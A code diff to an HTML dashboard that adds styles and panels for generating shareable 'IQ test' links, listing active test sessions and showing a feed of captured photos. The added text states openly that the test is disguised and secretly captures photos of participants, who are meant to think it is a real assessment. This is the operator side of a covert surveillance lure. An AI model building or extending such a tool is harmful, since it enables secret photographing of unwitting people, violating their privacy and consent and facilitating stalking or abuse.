@@ -158,6 +158,17 @@
       box-shadow: 0 8px 25px rgba(113, 128, 150, 0.3);
     }
     
+    .btn-success { 
+      background: linear-gradient(135deg, #48bb78, #38a169); 
+      color: #fff; 
+    }
+    
+    .btn-success:hover { 
+      background: linear-gradient(135deg, #38a169, #2f855a); 
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(72, 187, 120, 0.3);
+    }
+    
     .btn-small { 
       padding: 0.6rem 1rem; 
       font-size: 0.85rem; 
@@ -331,6 +342,149 @@
       .stats { grid-template-columns: 1fr; }
       .stat-number { font-size: 1.5rem; }
     }
+
+    /* IQ Test Specific Styles */
+    .sessions-list {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+
+    .iq-session-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      padding: 1.5rem;
+      border-radius: 1rem;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .iq-session-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(135deg, #9f7aea, #805ad5);
+    }
+
+    .iq-session-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+    }
+
+    .iq-session-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    .iq-session-name {
+      font-weight: 700;
+      color: #2d3748;
+      font-size: 1.1rem;
+    }
+
+    .iq-session-status {
+      padding: 0.3rem 0.8rem;
+      border-radius: 0.5rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .iq-session-status.active {
+      background: linear-gradient(135deg, #68d391, #38a169);
+      color: white;
+    }
+
+    .iq-session-status.completed {
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white;
+    }
+
+    .iq-session-info {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+      gap: 1rem;
+      color: #718096;
+      font-size: 0.85rem;
+    }
+
+    .iq-session-info .info-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .iq-photo-card {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(20px);
+      border-radius: 1rem;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      position: relative;
+    }
+
+    .iq-photo-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(135deg, #9f7aea, #805ad5);
+      z-index: 1;
+    }
+
+    .iq-photo-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+    }
+
+    .iq-photo-meta {
+      padding: 1.5rem;
+    }
+
+    .iq-photo-meta .participant {
+      font-weight: 700;
+      color: #2d3748;
+      margin-bottom: 0.5rem;
+      font-size: 1rem;
+    }
+
+    .iq-photo-meta .photo-type {
+      display: inline-block;
+      padding: 0.3rem 0.8rem;
+      background: linear-gradient(135deg, #9f7aea, #805ad5);
+      color: white;
+      border-radius: 0.5rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 0.5rem;
+    }
+
+    .iq-photo-meta .time {
+      font-size: 0.85rem;
+      color: #718096;
+      margin-bottom: 0.5rem;
+    }
+
+    .iq-photo-meta .question-info {
+      font-size: 0.85rem;
+      color: #805ad5;
+      font-weight: 500;
+    }
   </style>
 </head>
 <body>
@@ -370,6 +524,40 @@
         <div class="link-url" id="generatedLink"></div>
         <button class="btn btn-secondary btn-small" id="copyLinkBtn" style="margin-top: 0.75rem;">Copy Link</button>
       </div>
+    </div>
+
+    <div class="section">
+      <h2>🧠 Generate IQ Test Link</h2>
+      <div class="form-group">
+        <label for="iqTestName">Test Participant's Name (optional)</label>
+        <input type="text" id="iqTestName" placeholder="e.g., Alex, Sarah" />
+      </div>
+      <div class="form-group">
+        <label>Test Description:</label>
+        <p style="color: #718096; font-size: 0.85rem; margin-top: 0.5rem;">
+          This creates a disguised IQ test that captures photos while participants answer questions. 
+          They'll think it's a legitimate intelligence assessment.
+        </p>
+      </div>
+      <button class="btn btn-success" id="generateIQTestBtn">Generate IQ Test Link</button>
+      
+      <div id="iqLinkDisplay" class="link-display" style="display: none;">
+        <label>🧪 Share this IQ test link:</label>
+        <div class="link-url" id="generatedIQLink"></div>
+        <button class="btn btn-secondary btn-small" id="copyIQLinkBtn" style="margin-top: 0.75rem;">Copy Link</button>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>🧪 Active IQ Test Sessions</h2>
+      <div id="iqSessionsList" class="sessions-list">
+        <p style="color: #718096; text-align: center; padding: 2rem;">No active IQ test sessions</p>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>🔍 IQ Test Photo Captures</h2>
+      <div id="iqPhotoFeed" class="feed"></div>
     </div>
 
     <div class="section">
